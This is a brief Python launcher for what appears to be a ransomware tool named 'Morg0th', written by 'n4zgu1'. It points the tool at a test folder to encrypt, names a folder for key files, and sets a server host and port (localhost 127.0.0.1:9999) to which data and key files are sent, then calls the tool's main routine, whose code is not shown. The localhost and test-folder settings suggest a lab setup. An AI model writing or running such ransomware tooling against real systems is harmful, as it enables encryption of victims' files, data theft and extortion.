# morg0th scripted by n4zgu1

import src.main as launch
from datetime import datetime

target = '../testfolder'       # folder to encrypt
keyfolder = 'morgoth-keys'  # folder to  safe keyfiles
HOST = '127.0.0.1'          # ip of server to send data and keyfiles
PORT = 9999                 # port of server

print(f'Launching Morg0th at {datetime.now().strftime("%H:%M:%S")}')
launch.morgoth(target, keyfolder, HOST, PORT)
